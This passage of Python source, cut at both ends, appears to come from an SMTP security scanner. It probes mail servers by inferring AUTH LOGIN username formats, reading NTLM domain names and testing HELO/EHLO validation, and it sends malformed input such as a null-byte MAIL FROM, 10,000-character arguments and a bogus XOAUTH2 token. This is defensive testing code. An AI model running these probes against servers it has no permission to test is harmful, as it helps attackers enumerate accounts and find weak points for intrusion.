            invalid_user_responses=invalid_responses,
            valid_user_response=valid_response,
            enumerated_users=tuple(enumerated_list),
            detail=detail,
        )

    @staticmethod
    def _auth_format_last_two_labels(fqdn: str) -> str | None:
        """Last two DNS labels (no PSL — UK/JP etc. often wrong for 'organizational' domain)."""
        parts = fqdn.strip().lower().rstrip(".").split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return None

    def _auth_format_resolve_target_domain(self, ehlo_text: str) -> AuthFormatTargetDomainDerivation:
        """
        Domain for probe B: from scan hostname or, if target is IP, from first EHLO hostname line.
        Documented limitation: not PSL-aware (mail.company.co.uk → co.uk).
        """
        raw = (self.args.target.ip or "").strip()
        host_l = raw.lower().rstrip(".")
        try:
            ipaddress.ip_address(host_l)
            is_ip = True
        except ValueError:
            is_ip = False

        if not is_ip:
            dom = self._auth_format_last_two_labels(host_l)
            if dom:
                note = (
                    f"Derived '{dom}' as last 2 labels from scan target {host_l!r} "
                    f"(not PSL-aware — e.g. mail.company.co.uk → co.uk; compare probe B vs C if unsure)."
                )
                return AuthFormatTargetDomainDerivation(dom, "scan_last2", note, None, host_l)
            return AuthFormatTargetDomainDerivation(
                None,
                "none",
                "Scan target is not a multi-label hostname; probe B skipped.",
                None,
                host_l or None,
            )

        eh = _get_hostname_from_ehlo_raw(ehlo_text)
        if not eh:
            return AuthFormatTargetDomainDerivation(
                None,
                "none",
                "Scan target is an IP and no suitable hostname on first EHLO line; probe B skipped.",
                None,
                None,
            )
        dom = self._auth_format_last_two_labels(eh)
        if not dom:
            return AuthFormatTargetDomainDerivation(
                None,
                "none",
                f"Scan target is an IP; EHLO hostname {eh!r} is not suitable for last-2 derivation; probe B skipped.",
                eh,
                None,
            )
        note = (
            f"Scan target is an IP; derived '{dom}' from EHLO hostname {eh!r} "
            f"(last 2 labels, not PSL-aware — EHLO may differ from connection target)."
        )
        return AuthFormatTargetDomainDerivation(dom, "ehlo_last2", note, eh, None)

    def _ntlm_netbios_domain_probe(self) -> str | None:
        """One-shot NTLM negotiate to read NetBIOS/DNS name from challenge (optional 4th probe)."""
        smtp = None
        try:
            smtp, ehlo = self._get_smtp_for_auth_enum()
            if "NTLM" not in _get_auth_methods_from_ehlo(ehlo):
                return None
            code, resp = smtp.docmd("AUTH", "NTLM")
            if code != 334:
                return None
            smtp.send(b64encode(get_NegotiateMessage_data()) + smtplib.bCRLF)
            code2, resp2 = smtp.getreply()
            if code2 != 334:
                return None
            info = decode_ChallengeMessage_blob(b64decode(resp2))
            return (info.netbios_domain or info.dns_domain or info.target_name or "").strip() or None
        except Exception:
            return None
        finally:
            if smtp:
                try:
                    smtp.close()
                except Exception:
                    pass

    def _probe_auth_login_identity(
        self, identity: str
    ) -> tuple[int | None, bool, int | None, str | None, bool, str | None]:
        """
        Fresh connection: AUTH LOGIN → optional challenge decode → base64 identity.
        Returns:
            code_after_identity, password_phase, code_after_password, reply_after_identity,
            rate_limited, challenge_decoded (from first 334 after AUTH LOGIN).
        """
        smtp = None
        ch_dec: str | None = None
        try:
            smtp, _ = self._get_smtp_for_auth_enum()
            code, resp = smtp.docmd("AUTH", "LOGIN")
            ch_dec = _auth_format_decode_login_challenge(resp)
            if code in (421, 450, 452):
                return None, False, None, self.bytes_to_str(resp), True, ch_dec
            if code != 334:
                return code, False, None, self.bytes_to_str(resp), False, ch_dec
            id_b64 = b64encode(identity.encode("utf-8")).decode("ascii")
            code_u, resp_u = smtp.docmd(id_b64)
            if code_u in (421, 450, 452):
                return None, False, None, self.bytes_to_str(resp_u), True, ch_dec
            if code_u == 334:
                pw_b64 = b64encode(secrets.token_bytes(16)).decode("ascii")
                code_p, resp_p = smtp.docmd(pw_b64)
                return code_u, True, code_p, self.bytes_to_str(resp_u), False, ch_dec
            return code_u, False, None, self.bytes_to_str(resp_u), code_u in (421, 450, 452), ch_dec
        finally:
            if smtp:
                try:
                    smtp.close()
                except Exception:
                    pass

    def test_auth_format_probe(self) -> AuthFormatProbeResult:
        """
        PTL-SVC-SMTP-AUTH-FORMAT: infer expected AUTH LOGIN identity shape using a few non-destructive probes.
        Each probe uses a fresh connection; ~1.5s delay between probes to reduce rate-limit risk.
        """
        probe_user = f"ptauthfmt_{secrets.token_hex(4)}"
        try:
            sm0, ehlo0 = self._get_smtp_for_auth_enum()
            try:
                sm0.close()
            except Exception:
                pass
        except Exception as e:
            return AuthFormatProbeResult(
                "",
                (),
                None,
                None,
                f"Connection failed: {e}",
                "error",
                None,
                None,
                False,
                True,
                str(e),
                "none",
                None,
                None,
                None,
            )

        auth_methods = _get_auth_methods_from_ehlo(ehlo0)
        if "LOGIN" not in auth_methods:
            return AuthFormatProbeResult(
                "",
                (),
                None,
                None,
                "Server does not advertise AUTH LOGIN",
                "no_login",
                None,
                None,
                False,
                True,
                None,
                "none",
                None,
                None,
                None,
            )

        td_info = self._auth_format_resolve_target_domain(ehlo0)
        target_domain = td_info.domain
        netbios_domain = self._ntlm_netbios_domain_probe()

        plan: list[tuple[str, str, str | None, str | None]] = [
            ("single_label", "Single label", probe_user, None),
            (
                "target_domain",
                "Target domain e-mail",
                f"{probe_user}@{target_domain}" if target_domain else None,
                None if target_domain else "Target domain unknown (use hostname target or N/A)",
            ),
            (
                "external_domain",
                f"External domain ({AUTH_FORMAT_EXTERNAL_SUFFIX})",
                f"{probe_user}@{AUTH_FORMAT_EXTERNAL_SUFFIX}",
                None,
            ),
            (
                "netbios",
                "NetBIOS (DOMAIN\\user)",
                f"{netbios_domain}\\{probe_user}" if netbios_domain else None,
                None if netbios_domain else "NTLM not advertised or domain not decoded",
            ),
        ]

        rows_out: list[AuthFormatProbeRow] = []
        challenge_decoded: str | None = None
        challenge_hint: str | None = None
        rate_glob = False
        first_probe = True

        for pid, label, ident, skip_reason in plan:
            if not first_probe:
                time.sleep(AUTH_FORMAT_PROBE_DELAY_SEC)
            first_probe = False
            if rate_glob:
                rows_out.append(
                    AuthFormatProbeRow(
                        probe_id=pid,
                        label=label,
                        identity=ident or "",
                        skipped=True,
                        skip_reason="Skipped (previous probe rate-limited)",
                        code_after_identity=None,
                        password_phase=False,
                        code_after_password=None,
                        reply_after_identity=None,
                        rate_limited=False,
                    )
                )
                continue
            if ident is None:
                rows_out.append(
                    AuthFormatProbeRow(
                        probe_id=pid,
                        label=label,
                        identity="",
                        skipped=True,
                        skip_reason=skip_reason or "Skipped",
                        code_after_identity=None,
                        password_phase=False,
                        code_after_password=None,
                        reply_after_identity=None,
                        rate_limited=False,
                    )
                )
                continue
            try:
                c_id, pwd_ph, c_pw, reply_id, rl, ch1 = self._probe_auth_login_identity(ident)
            except Exception as ex:
                rows_out.append(
                    AuthFormatProbeRow(
                        probe_id=pid,
                        label=label,
                        identity=ident,
                        skipped=False,
                        skip_reason=None,
                        code_after_identity=None,
                        password_phase=False,
                        code_after_password=None,
                        reply_after_identity=str(ex),
                        rate_limited=False,
                    )
                )
                continue
            if challenge_decoded is None and ch1:
                challenge_decoded = ch1
                challenge_hint = _auth_format_hint_from_challenge_text(ch1)
            if rl:
                rate_glob = True
            if c_pw is not None and c_pw in (421, 450, 452):
                rate_glob = True
            rows_out.append(
                AuthFormatProbeRow(
                    probe_id=pid,
                    label=label,
                    identity=ident,
                    skipped=False,
                    skip_reason=None,
                    code_after_identity=c_id,
                    password_phase=pwd_ph,
                    code_after_password=c_pw,
                    reply_after_identity=reply_id,
                    rate_limited=rl,
                )
            )

        sym_map = {r.probe_id: _auth_format_row_symbol(r) for r in rows_out}
        sym_a = sym_map.get("single_label", "?")
        sym_b = sym_map.get("target_domain", "skip")
        sym_c = sym_map.get("external_domain", "?")
        sym_d = sym_map.get("netbios", "skip")
        b_ran = any(r.probe_id == "target_domain" and not r.skipped for r in rows_out)
        d_ran = any(r.probe_id == "netbios" and not r.skipped for r in rows_out)

        if rate_glob:
            cid, msg = (
                "rate_limited",
                "Probe stopped early: server returned temporary failure (421/450/452) — possible rate limiting",
            )
        elif sym_a == "rate" or sym_b == "rate" or sym_c == "rate" or sym_d == "rate":
            cid, msg = (
                "rate_limited",
                "Temporary failure during probe (421/450/452) — possible rate limiting",
            )
            rate_glob = True
        else:
            cid, msg = _auth_format_conclude(
                sym_a, sym_b, sym_c, sym_d, b_ran, d_ran, challenge_hint
            )
            if challenge_hint and cid == "mixed_responses":
                msg = f"{msg} (LOGIN challenge hint: {challenge_hint})"

        indet = cid in ("error", "no_login", "rate_limited", "indeterminate_no_target_domain", "challenge_hint_only")
        return AuthFormatProbeResult(
            method_tested="LOGIN",
            rows=tuple(rows_out),
            challenge_decoded=challenge_decoded,
            challenge_hint=challenge_hint,
            conclusion=msg,
            conclusion_id=cid,
            target_domain_used=target_domain,
            netbios_domain_used=netbios_domain,
            rate_limited=rate_glob or sym_a == "rate" or sym_b == "rate" or sym_c == "rate" or sym_d == "rate",
            indeterminate=indet,
            detail=None,
            target_domain_source=td_info.source,
            target_domain_analyst_note=td_info.analyst_note,
            target_domain_ehlo_hostname=td_info.ehlo_hostname,
            target_domain_scan_hostname=td_info.scan_hostname,
        )

    def test_helo_validation(self) -> HeloValidationResult:
        """
        Test HELO/EHLO hostname validation per RFC 5321 and best practices.
        Vectors: 123, abc (syntactic), localhost, [127.0.0.1], nonexistent.domain.test (DNS),
        target_domain (impersonation), mail.google.com (baseline).
        Handles 421/451 (rate-limiting) by returning indeterminate.
        Hostnames normalized to lowercase for comparison (RFC: domain names case-insensitive).
        """
        BASELINE = "mail.google.com"
        SYNTAX_VECTORS = ["123", "abc"]
        LOCALHOST = "localhost"
        IP_LITERAL = "[127.0.0.1]"
        DNS_NONEXISTENT = "nonexistent.domain.test"
        RATE_LIMIT_CODES = (421, 451)  # Transient failure / rate-limiting

        accepted: list[str] = []
        rejected: list[str] = []
        ehlo_comparison: dict[str, list[str]] = {}

        def _rate_limit_result(last_vector: str, status: int) -> HeloValidationResult:
            return HeloValidationResult(
                vulnerable=False,
                weak_config=False,
                indeterminate=True,
                ehlo_bypass=None,
                accepted_vectors=accepted.copy(),
                rejected_vectors=rejected.copy(),
                ehlo_comparison=ehlo_comparison if ehlo_comparison else None,
                detail=f"Rate-limiting detected (server returned {status}) during vector '{last_vector}'. Test interrupted.",
            )

        def _try_ehlo(hostname: str) -> tuple[int, str]:
            """Connect, send EHLO hostname, return (status, raw_reply). Close connection."""
            try:
                smtp, status, reply = self.connect()
                if status != 220:
                    return (status, self.bytes_to_str(reply))
                status, reply = smtp.docmd("EHLO", hostname)
                raw = self.bytes_to_str(reply)
                try:
                    smtp.quit()
                except Exception:
                    pass
                return (status, raw)
            except Exception as e:
                return (-1, str(e))

        def _store_ehlo(hostname: str, raw: str) -> None:
            """Store EHLO extensions keyed by hostname.lower() (RFC: domain names case-insensitive)."""
            ehlo_comparison[hostname.lower()] = _get_ehlo_extension_keys(raw)

        # 1. Baseline: mail.google.com
        status, raw = _try_ehlo(BASELINE)
        if status in RATE_LIMIT_CODES:
            return _rate_limit_result(BASELINE, status)
        if status != 250:
            return HeloValidationResult(
                vulnerable=False,
                weak_config=False,
                indeterminate=True,
                ehlo_bypass=None,
                accepted_vectors=[],
                rejected_vectors=[BASELINE],
                ehlo_comparison=None,
                detail=f"Baseline failed: server returned {status} for EHLO {BASELINE} (network/blacklist?)",
            )
        _store_ehlo(BASELINE, raw)
        accepted.append(BASELINE)
        target_domain = _get_hostname_from_ehlo_raw(raw)

        # 2. Syntactic vectors
        for vec in SYNTAX_VECTORS:
            status, _ = _try_ehlo(vec)
            if status in RATE_LIMIT_CODES:
                return _rate_limit_result(vec, status)
            if status == 250:
                accepted.append(vec)
            else:
                rejected.append(vec)

        # 3. localhost
        status, raw = _try_ehlo(LOCALHOST)
        if status in RATE_LIMIT_CODES:
            return _rate_limit_result(LOCALHOST, status)
        if status == 250:
            accepted.append(LOCALHOST)
            _store_ehlo(LOCALHOST, raw)
        else:
            rejected.append(LOCALHOST)

        # 4. IP literal
        status, _ = _try_ehlo(IP_LITERAL)
        if status in RATE_LIMIT_CODES:
            return _rate_limit_result(IP_LITERAL, status)
        if status == 250:
            accepted.append(IP_LITERAL)
        else:
            rejected.append(IP_LITERAL)

        # 5. DNS non-existent
        status, _ = _try_ehlo(DNS_NONEXISTENT)
        if status in RATE_LIMIT_CODES:
            return _rate_limit_result(DNS_NONEXISTENT, status)
        if status == 250:
            accepted.append(DNS_NONEXISTENT)
        else:
            rejected.append(DNS_NONEXISTENT)

        # 6. Identity impersonation (target_domain)
        if target_domain:
            status, raw = _try_ehlo(target_domain)
            if status in RATE_LIMIT_CODES:
                return _rate_limit_result(target_domain, status)
            if status == 250:
                accepted.append(target_domain)
                _store_ehlo(target_domain, raw)
            else:
                rejected.append(target_domain)

        # Classify
        vulnerable = any(v in accepted for v in SYNTAX_VECTORS + [LOCALHOST])
        weak_config = DNS_NONEXISTENT in accepted
        ehlo_bypass: bool | None = None
        baseline_keys = set(ehlo_comparison.get(BASELINE, []))
        for host, keys in ehlo_comparison.items():
            if host == BASELINE:
                continue
            if set(keys) - baseline_keys:
                ehlo_bypass = True
                break
        if ehlo_bypass is None and len(ehlo_comparison) > 1:
            ehlo_bypass = False

        detail_parts: list[str] = []
        if vulnerable:
            detail_parts.append("Accepts syntactic nonsense or localhost")
        if weak_config:
            detail_parts.append("Accepts non-existent FQDN (no DNS lookup)")
        if target_domain and target_domain in accepted:
            detail_parts.append("Accepts identity impersonation (own hostname)")
        if ehlo_bypass:
            detail_parts.append("EHLO extensions differ by hostname (access control bypass)")
        if not detail_parts:
            detail_parts.append("Strict HELO/EHLO validation (RFC 5321 best practices)")

        return HeloValidationResult(
            vulnerable=vulnerable,
            weak_config=weak_config,
            indeterminate=False,
            ehlo_bypass=ehlo_bypass,
            accepted_vectors=accepted,
            rejected_vectors=rejected,
            ehlo_comparison=ehlo_comparison if ehlo_comparison else None,
            detail="; ".join(detail_parts),
        )

    # XOAUTH2 bogus token: syntactically correct Base64, semantically nonsense (user=admin\0auth=Bearer 1234567890\0\0)
    _AUTH_DOWNGRADE_BOGUS_XOAUTH2 = b64encode(b"user=admin\x00auth=Bearer 1234567890\x00\x00").decode()

    def _inv_comm_reply_for_display(self, status: int | None, reply: str | None) -> str:
        """Strip leading status code from reply to avoid '501 501 ...' duplication."""
        if not reply or status is None:
            return reply or ""
        prefix = f"{status} "
        if reply.startswith(prefix):
            return reply[len(prefix):].lstrip()
        prefix_dash = f"{status}-"
        if reply.startswith(prefix_dash):
            return reply[len(prefix_dash):].lstrip()
        return reply

    def _inv_comm_vuln_type(self, status: int | None, got_response: bool, reply: str | None) -> str | None:
        """Determine vulnerability type: acceptance (2xx), timeout, or crash."""
        if status is not None and status < 300:
            return "acceptance"
        if status is None and not got_response:
            r = (reply or "").lower()
            if "timed out" in r or "timeout" in r:
                return "timeout"
            return "crash"
        return None

    def _inv_comm_info_leak(self, reply: str | None) -> bool:
        """Detect verbose error messages (paths, versions, stack trace)."""
        if not reply:
            return False
        r = reply.lower()
        patterns = [
            r"/var/", r"/usr/", r"/etc/", r"c:\\", r"c:/",
            r"compiled with", r"version\s+\d", r"openssl\s+[\d.]",
            r"traceback", r"at line", r"exception\s+in", r"stack trace",
            r"\.py\s+line", r"file\s+[\"'].*[\"']",
        ]
        for p in patterns:
            if re.search(p, r, re.IGNORECASE):
                return True
        return False

    def _inv_comm_raw_send_recv(
        self,
        raw_cmd: bytes,
        timeout: float = 10.0,
        existing_socket: socket.socket | ssl.SSLSocket | None = None,
    ) -> tuple[int | None, str | None, bool]:
        """
        Send raw SMTP command over TCP, read reply. Returns (status, reply_text, got_response_before_close).

        If existing_socket is provided (e.g. smtp.sock after EHLO+STARTTLS), uses it directly:
        skips connection/banner, sends raw_cmd, reads reply, does not close the socket.
        Caller establishes the session (EHLO, STARTTLS if needed) and manages the connection.

        If existing_socket is None: creates connection, uses TLS for --tls/port 465,
        reads banner, sends command, reads reply, closes socket.
        """
        got_response = False
        status: int | None = None
        reply_lines: list[str] = []
        host, port = self.args.target.ip, self.args.target.port

        def _send_and_read(sock: socket.socket | ssl.SSLSocket, skip_banner: bool = False) -> None:
            nonlocal got_response, status, reply_lines
            if not skip_banner:
                buf = b""
                while b"\r\n" not in buf and len(buf) < 8192:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    buf += chunk
                got_response = bool(buf)
            else:
                got_response = True
            sock.send(raw_cmd + b"\r\n")
            buf = b""
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                buf += chunk
                while b"\r\n" in buf:
                    line_bytes, buf = buf.split(b"\r\n", 1)
                    line = line_bytes.decode("utf-8", errors="replace")
                    reply_lines.append(line)
                    if len(line) >= 4 and line[3] in (" ", "\t"):
                        break
                if reply_lines and len(reply_lines[-1]) >= 4 and reply_lines[-1][3] in (" ", "\t"):
                    break
            if reply_lines and len(reply_lines[0]) >= 3 and reply_lines[0][:3].isdigit():
                status = int(reply_lines[0][:3])

        try:
            if existing_socket is not None:
                _send_and_read(existing_socket, skip_banner=True)
            else:
                sock = socket.create_connection((host, port), timeout=timeout)
                try:
                    if self.args.tls or port == 465:
                        ctx = ssl._create_unverified_context()
                        try:
                            try:
                                ipaddress.ip_address(host)
                                sni = None
                            except ValueError:
                                sni = host
                            sock = ctx.wrap_socket(sock, server_hostname=sni)
                        except Exception:
                            return (None, None, False)
                    _send_and_read(sock, skip_banner=False)
                finally:
                    try:
                        sock.close()
                    except Exception:
                        pass
        except ssl.SSLError as e:
            return (None, f"SSL Error: {e}", False)
        except (BrokenPipeError, ConnectionResetError):
            return (None, "Connection reset by peer", False)
        except Exception:
            pass
        reply_text = "\n".join(reply_lines) if reply_lines else None
        return (status, reply_text, got_response)

    def test_invalid_commands(self) -> InvCommResult:
        """
        Test invalid/non-standard SMTP commands (PTL-SVC-SMTP-INVCOMM).
        Verifies server handles invalid commands, long inputs, special chars, and bad sequences.
        421 = Service not available (often Greylisting/Anti-Spam) -> indeterminate.
        Slow response on long input -> possible ReDoS in parser -> weakness.
        Baseline latency measured first (NOOP) for adaptive threshold (e.g. satellite 500ms).
        Constant delay on all invalid commands -> tarpitting (smtpd_error_sleep_time), not parser bug.
        """
        RATE_LIMIT_CODES = (421, 451)  # 421 = often Greylisting/Anti-Spam, not app error
        SLOW_RESPONSE_BASE_SEC = 2.0  # Minimum threshold for ReDoS detection
        SLOW_RESPONSE_EXTRA_SEC = 1.5  # Added to baseline for high-latency links
        TARPIT_STDDEV_MAX = 0.5  # Max std dev of slow response times to consider tarpitting
        TARPIT_MIN_SLOW_COUNT = 2  # Min number of slow responses to detect tarpitting

        tests: list[InvCommTestCase] = []
        vulnerable = False
        weakness = False
        indeterminate = False
        baseline_latency_sec: float | None = None

        # Baseline: measure NOOP latency for adaptive slow_response threshold (e.g. satellite 500ms)
        try:
            smtp, conn_status, _ = self.connect()
            if conn_status == 220:
                try:
                    smtp.docmd("EHLO", self.fqdn)
                    t0 = time.perf_counter()
                    status, _ = smtp.docmd("NOOP")
                    baseline_latency_sec = time.perf_counter() - t0 if status == 250 else None
                finally:
                    try:
                        smtp.quit()
                    except Exception:
                        pass
        except Exception:
            pass

        slow_threshold = max(SLOW_RESPONSE_BASE_SEC, (baseline_latency_sec or 0) + SLOW_RESPONSE_EXTRA_SEC)

        def _run_docmd_test(cmd: str, args: str, category: str, display: str) -> InvCommTestCase:
            nonlocal vulnerable, weakness, indeterminate
            status: int | None = None
            reply: str | None = None
            session_ok: bool | None = None
            got_response = False
            elapsed: float = 0.0
            t0 = time.perf_counter()
            try:
                smtp, conn_status, conn_reply = self.connect()
                if conn_status != 220:
                    return InvCommTestCase(
                        category=category, command_display=display,
                        status=None, reply=self.bytes_to_str(conn_reply) if conn_reply else None,
                        session_ok=None, info_leak=False, vulnerable=True,
                        vuln_type="crash",
                    )
                try:
                    if cmd == "RCPT":
                        ehlo_status, ehlo_reply = smtp.docmd("EHLO", self.fqdn)
                        if ehlo_status != 250:
                            elapsed = time.perf_counter() - t0
                            if ehlo_status in RATE_LIMIT_CODES:
                                indeterminate = True
                            return InvCommTestCase(
                                category=category, command_display=display,
                                status=ehlo_status, reply=self.bytes_to_str(ehlo_reply) if ehlo_reply else None,
                                session_ok=None, info_leak=False, vulnerable=False,
                                response_time_sec=elapsed if elapsed > 0 else None,
                                slow_response=False, vuln_type=None,
                            )
                        mail_status, mail_reply = smtp.docmd("MAIL", "FROM:<test@example.com>")
                        if mail_status != 250:
                            elapsed = time.perf_counter() - t0
                            if mail_status in RATE_LIMIT_CODES:
                                indeterminate = True
                            return InvCommTestCase(
                                category=category, command_display=display,
                                status=mail_status, reply=self.bytes_to_str(mail_reply) if mail_reply else None,
                                session_ok=None, info_leak=False, vulnerable=False,
                                response_time_sec=elapsed if elapsed > 0 else None,
                                slow_response=False, vuln_type=None,
                            )
                    t0 = time.perf_counter()
                    status, reply_bytes = smtp.docmd(cmd, args)
                    elapsed = time.perf_counter() - t0
                    reply = self.bytes_to_str(reply_bytes) if reply_bytes else None
                    got_response = True
                    if status in RATE_LIMIT_CODES:
                        indeterminate = True
                    if status in (250, 251):
                        vulnerable = True
                    if self._inv_comm_info_leak(reply):
                        weakness = True
                    try:
                        rset_status, _ = smtp.docmd("RSET")
                        session_ok = rset_status == 250
                    except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                        session_ok = False
                        if got_response:
                            pass
                        else:
                            vulnerable = True
                finally:
                    try:
                        smtp.quit()
                    except Exception:
                        pass
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError, socket.timeout) as e:
                elapsed = time.perf_counter() - t0
                if not got_response:
                    vulnerable = True
                reply = str(e) if reply is None else reply
            except Exception as e:
                elapsed = time.perf_counter() - t0
                reply = str(e)
                if not got_response:
                    vulnerable = True
            case_vuln = (status in (250, 251) if status else False) or (status is None and not got_response)
            vt = "acceptance" if (status is not None and status < 300) else self._inv_comm_vuln_type(status, got_response, reply) if case_vuln else None
            return InvCommTestCase(
                category=category,
                command_display=display,
                status=status,
                reply=reply,
                session_ok=session_ok,
                info_leak=self._inv_comm_info_leak(reply) if reply else False,
                vulnerable=case_vuln,
                response_time_sec=elapsed if elapsed > 0 else None,
                slow_response=False,
                vuln_type=vt,
            )

        def _run_long_input_test(cmd: str, args: str, display: str) -> InvCommTestCase:
            """Run long-input test with timing; flag slow response as possible ReDoS."""
            nonlocal vulnerable, weakness, indeterminate
            status: int | None = None
            reply: str | None = None
            session_ok: bool | None = None
            got_response = False
            elapsed: float = 0.0
            slow = False
            t0 = time.perf_counter()
            try:
                smtp, conn_status, conn_reply = self.connect()
                if conn_status != 220:
                    return InvCommTestCase(
                        category="long_input", command_display=display,
                        status=None, reply=self.bytes_to_str(conn_reply) if conn_reply else None,
                        session_ok=None, info_leak=False, vulnerable=True,
                        response_time_sec=None, slow_response=False,
                        vuln_type="crash",
                    )
                try:
                    if cmd == "MAIL":
                        smtp.docmd("EHLO", self.fqdn)
                    t0 = time.perf_counter()
                    status, reply_bytes = smtp.docmd(cmd, args)
                    elapsed = time.perf_counter() - t0
                    reply = self.bytes_to_str(reply_bytes) if reply_bytes else None
                    got_response = True
                    if status in RATE_LIMIT_CODES:
                        indeterminate = True
                    if status in (250, 251):
                        vulnerable = True
                    if self._inv_comm_info_leak(reply):
                        weakness = True
                    if elapsed > slow_threshold:
                        slow = True
                        weakness = True
                    try:
                        rset_status, _ = smtp.docmd("RSET")
                        session_ok = rset_status == 250
                    except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                        session_ok = False
                        if not got_response:
                            vulnerable = True
                finally:
                    try:
                        smtp.quit()
                    except Exception:
                        pass
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError, socket.timeout) as e:
                elapsed = time.perf_counter() - t0
                if not got_response:
                    vulnerable = True
                reply = str(e) if reply is None else reply
            except Exception as e:
                elapsed = time.perf_counter() - t0
                reply = str(e)
                if not got_response:
                    vulnerable = True
            case_vuln = (status in (250, 251) if status else False) or (status is None and not got_response)
            vt = "acceptance" if (status is not None and status < 300) else self._inv_comm_vuln_type(status, got_response, reply) if case_vuln else None
            return InvCommTestCase(
                category="long_input",
                command_display=display,
                status=status,
                reply=reply,
                session_ok=session_ok,
                info_leak=self._inv_comm_info_leak(reply) if reply else False,
                vulnerable=case_vuln,
                response_time_sec=elapsed if elapsed > 0 else None,
                slow_response=slow,
                vuln_type=vt,
            )

        # 1. Invalid commands
        invalid_cmds = [
            ("HELLO", "", "HELLO"),
            ("MAILFROM", ":<>", "MAILFROM:"),
            ("RCPT", ":test@example.com", "RCPT:"),
            ("DATAAAAA", "", "DATAAAAA"),
            ("FOO", "BAR", "FOO BAR"),
            ("HACK", "", "HACK"),
        ]
        for cmd, args, display in invalid_cmds:
            t = _run_docmd_test(cmd, args, "invalid", display)
            tests.append(t)
            if indeterminate:
                break

        if not indeterminate:
            # 2. Long inputs (10000 chars) - measure response time for ReDoS detection
            long_a = "A" * 10000
            tests.append(_run_long_input_test("MAIL", f"FROM:<{long_a}@example.com>", "MAIL FROM:<A*10000>"))
            if not indeterminate:
                tests.append(_run_long_input_test("HELO", long_a, "HELO A*10000"))

        if not indeterminate:
            # 3. Bad sequence: DATA right after EHLO
            bad_seq_elapsed: float = 0.0
            t0_bad = time.perf_counter()
            try:
                smtp, conn_status, _ = self.connect()
                if conn_status == 220:
                    try:
                        smtp.docmd("EHLO", self.fqdn)
                        t0_bad = time.perf_counter()
                        status, reply_bytes = smtp.docmd("DATA", "")
                        bad_seq_elapsed = time.perf_counter() - t0_bad
                        reply = self.bytes_to_str(reply_bytes) if reply_bytes else None
                        got_response = True
                        if status in (250, 354):
                            vulnerable = True
                        if self._inv_comm_info_leak(reply):
                            weakness = True
                        try:
                            rset_status, _ = smtp.docmd("RSET")
                            session_ok = rset_status == 250
                        except Exception:
                            session_ok = False
                        tests.append(InvCommTestCase(
                            category="bad_sequence",
                            command_display="DATA after EHLO (no MAIL/RCPT)",
                            status=status,
                            reply=reply,
                            session_ok=session_ok,
                            info_leak=self._inv_comm_info_leak(reply) if reply else False,
                            vulnerable=status in (250, 354) if status else False,
                            response_time_sec=bad_seq_elapsed,
                            slow_response=False,
                            vuln_type="acceptance" if status in (250, 354) else None,
                        ))
                    finally:
                        try:
                            smtp.quit()
                        except Exception:
                            pass
            except Exception:
                bad_seq_elapsed = time.perf_counter() - t0_bad
                tests.append(InvCommTestCase(
                    category="bad_sequence",
                    command_display="DATA after EHLO (no MAIL/RCPT)",
                    status=None,
                    reply=None,
                    session_ok=None,
                    info_leak=False,
                    vulnerable=True,
                    response_time_sec=bad_seq_elapsed,
                    slow_response=False,
                    vuln_type="crash",
                ))

        if not indeterminate:
            # 4. Special chars via raw socket (null byte) - plain TCP, implicit TLS, or STARTTLS
            raw_elapsed: float = 0.0
            t0_raw = time.perf_counter()
            if self.args.starttls:
                status, reply, got_response = None, None, False
                try:
                    smtp, conn_status, _ = self.connect()
                    if conn_status == 220:
                        try:
                            # RFC 3207: send EHLO again after TLS handshake (server may change capabilities)
                            smtp.docmd("EHLO", self.fqdn)
                            t0_raw = time.perf_counter()
                            status, reply, got_response = self._inv_comm_raw_send_recv(
                                b"MAIL FROM:<test\x00@test.example.com>",
                                existing_socket=smtp.sock,
                            )
                            raw_elapsed = time.perf_counter() - t0_raw
                        finally:
                            try:
                                smtp.quit()
                            except Exception:
                                pass
                except Exception:
                    raw_elapsed = time.perf_counter() - t0_raw
            else:
                status, reply, got_response = None, None, False
                try:
                    smtp, conn_status, _ = self.connect()
                    if conn_status == 220:
                        try:
                            smtp.docmd("EHLO", self.fqdn)
                            t0_raw = time.perf_counter()
                            status, reply, got_response = self._inv_comm_raw_send_recv(
                                b"MAIL FROM:<test\x00@test.example.com>",
                                existing_socket=smtp.sock,
                            )
                            raw_elapsed = time.perf_counter() - t0_raw
                        finally:
                            try:
                                smtp.quit()
                            except Exception:
                                pass
                    else:
                        raw_elapsed = 0.0
                except Exception:
                    raw_elapsed = 0.0
            if status is None and not got_response:
                vulnerable = True
            case_vuln = (status in (250, 251) if status else False) or (status is None and not got_response)
            vt = "acceptance" if (status is not None and status < 300) else self._inv_comm_vuln_type(status, got_response, reply) if case_vuln else None
            tests.append(InvCommTestCase(
                category="special_chars",
                command_display="MAIL FROM:<test\\x00@test.example.com>",
                status=status,
                reply=reply,
                session_ok=None,
                info_leak=self._inv_comm_info_leak(reply) if reply else False,
                vulnerable=case_vuln,
                response_time_sec=raw_elapsed,
                slow_response=False,
                vuln_type=vt,
            ))
            if status in (250, 251):
                vulnerable = True

        # 5. Session stability check
        if tests and not indeterminate:
            try:
                smtp, conn_status, _ = self.connect()
                if conn_status == 220:
                    try:
                        smtp.docmd("EHLO", self.fqdn)
                        status, _ = smtp.docmd("NOOP")
                        if status != 250:
                            pass
                    finally:
                        try:
                            smtp.quit()
                        except Exception:
                            pass
            except Exception:
                pass

        # Tarpitting detection: constant delay on invalid commands (smtpd_error_sleep_time) -> not parser bug
        slow_times = [t.response_time_sec for t in tests if getattr(t, "slow_response", False) and getattr(t, "response_time_sec", None) is not None]
        tarpitting_detected = (
            len(slow_times) >= TARPIT_MIN_SLOW_COUNT
            and statistics.stdev(slow_times) < TARPIT_STDDEV_MAX
        )
        if tarpitting_detected:
            weakness_from_slow = any(getattr(t, "slow_response", False) for t in tests)
            if weakness_from_slow:
                weakness = bool(any(self._inv_comm_info_leak(t.reply) for t in tests if t.reply))

        # Build detail
        vuln_tests = [t for t in tests if t.vulnerable]
        slow_tests = [t for t in tests if getattr(t, "slow_response", False)]
        vulnerable = vulnerable or bool(vuln_tests)  # Ensure overall vulnerable if any test is
        if indeterminate:
            detail = "421/451 Service not available - often Greylisting or Anti-Spam protection (indeterminate, not necessarily application error)"
        elif vulnerable:
